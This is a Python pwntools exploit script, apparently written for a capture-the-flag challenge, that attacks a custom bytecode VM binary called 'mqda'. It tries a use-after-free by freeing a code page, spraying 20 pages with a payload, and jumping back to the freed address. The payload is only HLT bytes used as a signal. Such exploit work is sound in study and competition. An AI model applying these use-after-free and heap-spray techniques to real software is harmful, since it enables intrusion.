#!/usr/bin/env python3
"""
Heap Spray UAF Exploit:
1. Free code page at 0x10000
2. Allocate new page at 0x30000 (different address) that reuses freed memory
3. Write controlled bytes to 0x30000
4. Jump to 0x10000 -> executes our bytes from step 3!

Challenge: The new allocation might not reuse the exact same memory.
We need to spray allocations to increase chances.
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def jmp_reg(reg):
    return bytes([0x0E, reg])

def push_reg(reg):
    return bytes([0x02, reg])

code_addr1 = 0x10000  # Will be freed
code_addr2 = 0x10100  # Safe code (page 2)
code_addr3 = 0x10200  # More safe code (page 3)

# Stage 1: Jump to page 2
code1 = b''
code1 += mov_reg_imm(0, code_addr2)
code1 += jmp_reg(0)
code1 = code1.ljust(256, b'\xff')

# Stage 2 (at 0x10100): Zero page 1, then allocate new pages, then jump back
code2 = b''

# Zero page 0x10000
for offset in range(0, 256, 4):
    sp = 0x10000 | offset
    code2 += mov_reg_imm(15, sp)
    code2 += mov_reg_imm(0, 0)
    code2 += push_reg(0)

# Page 0x10000 is now freed after this instruction completes
# Now allocate many new pages to try to reuse the freed memory
# Each new page should contain our payload

# Our payload: HLT (0x00) to confirm controlled execution
# If freed page gets reused, it should contain zeros = HLT
# Let's put something distinctive instead

# Actually, let's think about this differently.
# After freeing page 0x10000, allocate pages at 0x20000, 0x21000, etc.
# One of these might reuse the freed 0x10000 chunk
# Then write our "malicious code" to that page
# When we jump to 0x10000, we execute whatever is in that reused chunk

# Payload we want to execute: print something distinguishable
# But VM has no print... we can only signal via exit codes

# Let's make payload = 0x00 (HLT with exit code 1)
# If we see TERMINATED (exit 1), payload executed

payload = bytes([0x00, 0x00, 0x00, 0x00])  # HLT, padded

# Allocate new pages and write payload
for page_idx in range(20):  # Allocate 20 pages
    new_page_addr = 0x20000 + page_idx * 0x100
    # Write payload bytes to new page
    for i in range(0, len(payload), 4):
        offset = i
        sp = new_page_addr | offset
        code2 += mov_reg_imm(15, sp)
        code2 += mov_reg_imm(0, u32(payload[i:i+4].ljust(4, b'\x00')))
        code2 += push_reg(0)

# Now jump back to freed page 0x10000
code2 += mov_reg_imm(0, code_addr1)
code2 += jmp_reg(0)
code2 += hlt()  # Fallback

code2 = code2.ljust(256 * 4, b'\xff')  # Pad to fill multiple pages

full_code = code1 + code2

print(f"[*] Total code length: {len(full_code)} bytes")

if len(full_code) > 4096:
    print(f"[-] Code too long! Max is 4096")
    exit(1)

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr1).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(full_code)).encode())
p.recvuntil(b'Code> ')
p.send(full_code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr1).encode())

output = p.recvall(timeout=3)
print(f"Output: {output}")

p.close()
